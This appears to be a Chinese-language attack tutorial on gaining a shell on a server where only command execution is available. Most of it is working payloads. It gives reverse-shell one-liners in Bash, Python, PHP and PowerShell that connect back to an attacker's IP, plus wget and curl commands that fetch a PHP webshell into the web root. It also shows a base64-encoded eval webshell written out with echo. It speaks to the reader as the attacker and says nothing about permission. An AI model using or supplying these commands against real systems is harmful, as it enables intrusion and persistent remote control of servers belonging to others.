### 对于不能直接上传而只能通过命令行执行的 Shell 怎么办

**1. 反弹 Shell**

这是最常用、最有效的方法。它的原理是让目标服务器主动连接到你的攻击机，而不是让你去连接它。这能绕过目标服务器的防火墙和出站连接限制，同时给你一个完整的交互式 shell

**基本步骤：**

1. **在你的攻击机上设置监听**： 你需要一个网络监听器来等待来自目标服务器的连接。常用的工具有 `netcat` (nc) 或 `socat`

   ```bash
   # 使用 netcat 监听 4444 端口
   nc -lvnp 4444 
   ```

   `l` 表示监听，`v` 表示显示详细信息，`n` 表示不进行DNS解析，`p` 表示指定端口

2. **在目标服务器上执行反弹 shell 命令**： 根据目标服务器的操作系统和已有的工具，执行不同的命令

   - **Bash**：

     ```bash
     bash -i >& /dev/tcp/你的IP/4444 0>&1
     ```

   - **Python**：

     ```python
     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<你的IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
     ```

   - **PHP**：

     ```php
     php -r '$sock=fsockopen("<你的IP>",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
     ```

3. **获取交互式 shell**： 当目标服务器执行该命令后，它会连接到你的监听端口。你的 `netcat` 窗口会显示连接成功的消息，并且你将获得一个可执行命令的 shell

**2. 通过 Web 请求传输文件**

如果目标服务器允许出站请求，并且你可以控制这些请求（比如通过 `curl` 或 `wget`），那么你可以让目标服务器从你的攻击机上下载文件

1. **在你的攻击机上创建一个简单的 HTTP 服务器**： 将你的 shell 文件（如一个 PHP Webshell）放在一个目录下，并用 Python 启动一个简单的 Web 服务器

   ```sh
   # 在你的 shell 文件所在目录下执行
   python3 -m http.server 80
   ```

2. **在目标服务器上执行下载命令**： 利用命令注入点，让目标服务器下载文件

   ```sh
   # 使用 wget
   wget http://你的IP/shell.php -O /var/www/html/shell.php
   
   # 或者使用 curl
   curl http://你的IP/shell.php > /var/www/html/shell.php
   ```

   **注意**：你需要知道一个可写的、Web 服务器可以访问的目录（如 `/var/www/html/` 或 `/tmp/`）。如果 `/tmp` 目录可以写入，你可以先下载到 `/tmp`，再想办法移动到 Web 目录

**3. 利用内置工具**

有些服务器环境自带一些可以创建 shell 的工具

- **VBScript / PowerShell (Windows)**： Windows 系统的 PowerShell 拥有强大的网络功能。你可以使用 PowerShell 来实现反弹 shell

  ```powershell
  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<你的IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();"
  ```

  由于命令很长，你可以将其编码为 Base64 来避免空格和特殊字符的问题

**4. 利用 `echo` 或其他写入命令**

如果目标服务器的出站连接被严格限制，你不能使用反弹 shell 或下载文件，但可以执行命令行。你可以通过 `echo` 命令，一行一行地将 shell 代码写入到一个文件中

**基本步骤：**

1. **将你的 shell 代码进行编码**： 为了避免引号和特殊字符问题，你可以将代码进行 Base64 编码。

2. **使用 `echo` 和 Base64 解码命令**：

   ```bash
   # 假设你的 shell 代码经过 Base64 编码后为 "PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4="
   echo "PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=" | base64 -d > /var/www/html/shell.php
   ```

   如果服务器不支持 `base64 -d`，你可能需要用其他方法，比如分多行写入，或者利用 `python -c 'print ...'` 来写入文件